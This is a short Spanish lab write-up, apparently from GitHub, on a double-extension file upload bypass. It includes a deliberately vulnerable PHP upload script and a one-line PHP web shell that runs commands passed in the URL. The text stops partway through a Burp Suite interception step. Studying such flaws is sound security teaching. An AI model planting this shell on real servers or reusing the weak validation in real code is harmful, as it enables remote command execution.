
En este caso el codigo php vulnerable a arbitrary file upload es el siguiente:

```php

<?php
if (isset($_FILES['file'])) {
    $file = $_FILES['file'];
    $extension = pathinfo($file['name'], PATHINFO_EXTENSION);
    
    $allowed = ['jpg', 'png', 'gif'];
    
    if (in_array($extension, $allowed)) {
        $destination = "/var/www/html/uploads/" . $file['name'];
        move_uploaded_file($file['tmp_name'], $destination);
        echo "File uploaded: " . $destination;
    } else {
        echo "Only images allowed";
    }
}
?>

<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="Upload">
</form>


```

Problemas: 

Solo valida la ultima extension (vulnerable a doble extension: file.php.jpg)

Este codigo es vulnerable a doble extension.

Si subimos un archivo php como tal no dejara:

<img width="376" height="140" alt="image" src="https://github.com/user-attachments/assets/7126b11d-4175-488a-ada4-3448d4e7bf5f" />

Bypass:

Cambiar el archivo a .php.jpg con el contenido de php malicioso:

``` php
<?php system($_GET['cmd']); ?>
```

Si lo subimos: 

<img width="392" height="142" alt="image" src="https://github.com/user-attachments/assets/67135c84-1f2a-443d-baef-e7ff136e7894" />

Podemos ejecutar comandos mediante el archivo malicioso php:

<img width="548" height="134" alt="image" src="https://github.com/user-attachments/assets/510fd985-309c-4dc6-b96d-bf34b2b10bac" />

Si subimos el archivo cmd.jpg y interceptamos la subida en burpsuite, luego le canviamos la exntesion de jpg a php:










